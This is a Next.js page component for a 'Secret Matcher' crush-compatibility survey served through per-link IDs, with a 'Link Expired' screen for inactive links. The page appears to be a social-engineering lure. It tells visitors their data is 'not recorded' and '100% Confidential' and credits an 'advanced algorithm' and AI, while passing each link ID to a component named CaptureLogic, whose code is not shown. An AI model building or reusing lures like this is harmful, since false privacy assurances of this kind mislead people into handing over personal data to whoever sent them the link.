import CaptureLogic from './CaptureLogic';
import { notFound } from 'next/navigation';

async function checkLinkValidity(id) {
  // We need to call our own API or query DB directly. 
  // Since this is a server component, query DB directly is faster.
  const { openDb } = await import('@/lib/db');
  try {
    const db = await openDb();
    const link = await db.get('SELECT * FROM links WHERE id = ? AND is_active = 1', [id]);
    return !!link;
  } catch (e) {
     return false;
  }
}

export default async function SurveyPage({ params }) {
  const { id } = await params;
  const isValid = await checkLinkValidity(id);

  if (!isValid) {
    return (
      <div className="min-h-screen bg-gray-900 flex flex-col items-center justify-center p-4 text-center">
        <h1 className="text-4xl text-red-500 font-bold mb-4">Link Expired</h1>
        <p className="text-gray-400">This secret match link has expired or never existed.</p>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#0a0a0f] flex items-center justify-center p-4 pb-20 selection:bg-pink-500/30">
      {/* Background Ambience */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute -top-[20%] -left-[10%] w-[50%] h-[50%] bg-pink-600/20 blur-[120px] rounded-full"></div>
        <div className="absolute top-[60%] -right-[10%] w-[40%] h-[60%] bg-purple-600/20 blur-[120px] rounded-full"></div>
      </div>

      <div className="relative z-10 w-full max-w-md">
        {/* Main Card */}
        <div className="bg-white/5 backdrop-blur-xl border border-white/10 p-8 rounded-3xl shadow-2xl shadow-pink-900/20">
          
          <div className="text-center mb-8">
            <div className="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-gradient-to-br from-pink-500 to-purple-600 mb-4 shadow-lg shadow-pink-500/30">
              <span className="text-3xl">💘</span>
            </div>
            <h1 className="text-3xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-pink-300 to-purple-400">
              Secret Matcher
            </h1>
            <p className="text-pink-200/60 text-sm mt-2 font-medium">
              Find out if your crush is your soulmate based on our advanced algorithm.
            </p>
            <p className="text-yellow-500/80 text-xs mt-3 italic bg-yellow-500/10 inline-block px-3 py-1 rounded-full">
              * This is not recorded the your valuable data
            </p>
          </div>

          <CaptureLogic linkId={id} />
          
        </div>
        
        <p className="text-center text-xs text-white/30 mt-6 flex gap-2 justify-center">
          <span>Powered by AI</span> • <span>100% Confidential</span>
        </p>
      </div>
    </div>
  );
}
